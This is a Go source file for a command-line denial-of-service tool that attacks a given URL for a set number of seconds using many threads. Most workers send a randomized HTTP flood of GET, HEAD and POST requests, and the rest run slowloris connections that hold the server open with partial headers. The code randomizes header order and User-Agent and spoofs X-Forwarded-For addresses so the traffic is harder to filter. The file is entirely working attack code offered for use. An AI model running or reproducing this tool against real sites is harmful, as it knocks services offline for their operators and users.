package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"sync"
	"time"
)

var (
	ip            string
	ips           []string
	port          int
	path          string
	threads       int
	timer         int
	customHost    string
	httpMethods   = []string{"GET", "HEAD", "POST"}
	userAgents    = []string{"Mozilla/5.0", "AppleWebKit/537.36", "Chrome/91.0", "Safari/537.36"}
	platforms     = []string{"Macintosh", "Windows", "Linux", "Android", "iPhone"}
	slowlorisRate = 0.2 // float64 type
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func resolveDNS(hostname string) {
	addrs, err := net.LookupIP(hostname)
	if err != nil {
		fmt.Println("DNS resolution failed:", err)
		os.Exit(1)
	}
	for _, addr := range addrs {
		if ipv4 := addr.To4(); ipv4 != nil {
			ips = append(ips, ipv4.String())
		}
	}
	if len(ips) == 0 {
		fmt.Println("No IPs resolved")
		os.Exit(1)
	}
}

func randomUserAgent() string {
	return userAgents[rand.Intn(len(userAgents))] + " " + platforms[rand.Intn(len(platforms))]
}

func buildRequest(method, path string) []byte {
	host := customHost
	if host == "" {
		host = ip
	}

	// Randomize header order and content
	headers := []string{
		fmt.Sprintf("Host: %s", host),
		fmt.Sprintf("User-Agent: %s", randomUserAgent()),
		"Accept: */*",
		"Accept-Encoding: gzip, deflate",
		fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)),
		"Cache-Control: no-cache",
	}

	if method == "POST" {
		data := fmt.Sprintf("data=%d", rand.Intn(1000000))
		headers = append(headers,
			"Content-Type: application/x-www-form-urlencoded",
			fmt.Sprintf("Content-Length: %d", len(data)),
		)
		rand.Shuffle(len(headers), func(i, j int) {
			headers[i], headers[j] = headers[j], headers[i]
		})
		return []byte(fmt.Sprintf("%s %s HTTP/1.1\r\n%s\r\n\r\n%s",
			method, path, joinHeaders(headers), data))
	}

	rand.Shuffle(len(headers), func(i, j int) {
		headers[i], headers[j] = headers[j], headers[i]
	})
	return []byte(fmt.Sprintf("%s %s HTTP/1.1\r\n%s\r\n\r\n",
		method, path, joinHeaders(headers)))
}

func joinHeaders(headers []string) string {
	var result string
	for _, h := range headers {
		result += h + "\r\n"
	}
	return result
}

func floodWorker(id int, stop <-chan struct{}) {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         ip,
	}

	for {
		select {
		case <-stop:
			return
		default:
			target := fmt.Sprintf("%s:%d", ips[rand.Intn(len(ips))], port)
			conn, err := createConnection(target, tlsConfig)
			if err != nil {
				continue
			}

			for i := 0; i < rand.Intn(100)+100; i++ { // 50-100 requests/connection
				method := httpMethods[rand.Intn(len(httpMethods))]
				reqPath := path
				if rand.Intn(2) == 0 {
					reqPath += fmt.Sprintf("?rand=%d", rand.Intn(1000000))
				}
				conn.Write(buildRequest(method, reqPath))
				time.Sleep(time.Millisecond * time.Duration(rand.Intn(15)))
			}
			conn.Close()
		}
	}
}

func slowlorisWorker(id int, stop <-chan struct{}) {
	tlsConfig := &tls.Config{InsecureSkipVerify: true}

	for {
		select {
		case <-stop:
			return
		default:
			target := fmt.Sprintf("%s:%d", ips[rand.Intn(len(ips))], port)
			conn, err := createConnection(target, tlsConfig)
			if err != nil {
				continue
			}

			partial := fmt.Sprintf("GET %s?slow=%d HTTP/1.1\r\nHost: %s\r\n", 
				path, rand.Intn(10000), ip)
			conn.Write([]byte(partial))

			// Keep connection alive with partial headers
			for i := 0; i < 10; i++ {
				select {
				case <-stop:
					conn.Close()
					return
				case <-time.After(time.Second * 5):
					conn.Write([]byte(fmt.Sprintf("X-a: %d\r\n", rand.Intn(100))))
				}
			}
			conn.Close()
		}
	}
}

func createConnection(target string, tlsConfig *tls.Config) (net.Conn, error) {
	if port == 443 {
		return tls.Dial("tcp", target, tlsConfig)
	}
	return net.Dial("tcp", target)
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: <URL> <THREADS> <TIMER> [CUSTOM_HOST]")
		return
	}

	u, err := url.Parse(os.Args[1])
	if err != nil {
		fmt.Println("URL error:", err)
		return
	}

	ip = u.Hostname()
	port, _ = strconv.Atoi(u.Port())
	if port == 0 {
		if u.Scheme == "https" {
			port = 443
		} else {
			port = 80
		}
	}
	path = u.Path
	if path == "" {
		path = "/"
	}

	threads, _ = strconv.Atoi(os.Args[2])
	timer, _ = strconv.Atoi(os.Args[3])
	if len(os.Args) > 4 {
		customHost = os.Args[4]
	}

	resolveDNS(ip)
	fmt.Printf("Target: %s:%d (%d IPs)\n", ip, port, len(ips))

	stop := make(chan struct{})
	var wg sync.WaitGroup

	// Start workers
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			if rand.Float64() < slowlorisRate {
				slowlorisWorker(id, stop)
			} else {
				floodWorker(id, stop)
			}
		}(i)
	}

	// Run for specified duration
	time.Sleep(time.Duration(timer) * time.Second)
	close(stop)
	wg.Wait()
	fmt.Println("Attack completed")
}
